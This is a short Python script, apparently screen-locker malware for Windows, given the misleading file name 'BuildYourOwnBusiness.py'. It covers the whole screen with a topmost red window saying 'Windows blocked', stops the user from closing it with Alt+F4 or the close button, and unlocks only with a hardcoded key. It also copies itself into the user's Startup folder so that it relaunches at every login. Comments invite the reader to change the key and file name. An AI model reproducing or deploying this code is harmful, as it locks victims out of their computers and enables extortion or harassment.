try:    
    import tkinter as tk
    import os
    import shutil
    import sys
except:
    print("Import Error")

file = "BuildYourOwnBusiness.py" # If you convert the script to exe with pyinstaller or rename the file, change the name.

def on_close(event=None):
    print("Schließen blockiert")

def check_input():
    entered_text = entry.get()
    if entered_text.lower() == "08wn9iremc4sjj6juxdy": # Change the Key, if you want...
        root.quit()

def on_key(event):
    if event.keysym.lower() == "f4" and event.state == 8:
        return "break"

def auto_start():
    try:
        current_path = sys.executable
        autostart_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_path = os.path.join(autostart_folder, str(file))
        shutil.copy2(current_path, target_path)
    except Exception as e:
        print(f"Auto-start error: {e}")
        pass

def create_widgets():
    global entry, button, label

    entry = tk.Entry(root, font=("Helvetica", 60))
    entry.place(x=screen_width // 2, y=500, anchor=tk.CENTER)

    button = tk.Button(root, font=("Helvetica", 40), fg="#f40000", bg="#ffffff", text="Proof Key", command=check_input)
    button.place(x=screen_width // 2, y=700, anchor=tk.CENTER)

    label_text_1 = "Ops... Windows blocked!"
    label = tk.Label(root, text=label_text_1, font= ("Helvetica", 100), fg="#454545")
    label.place(x=screen_width // 2, y=100, anchor=tk.CENTER)

    label_text_2 = "This window has been secured and is no longer accessible. Please input the required key:"
    label = tk.Label(root, text=label_text_2, font=("Helvetica", 20), fg="#454545")
    label.place(x=screen_width // 2, y=400, anchor=tk.CENTER)

# Hauptteil des Skripts
root = tk.Tk()
root.configure(background="#f40000")

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.overrideredirect(True)

create_widgets()

root.protocol("WM_DELETE_WINDOW", on_close)
root.bind("<Key>", on_key)

root.geometry(f"{screen_width}x{screen_height}")
root.lift()
root.attributes('-topmost', True)

auto_start()

root.mainloop()
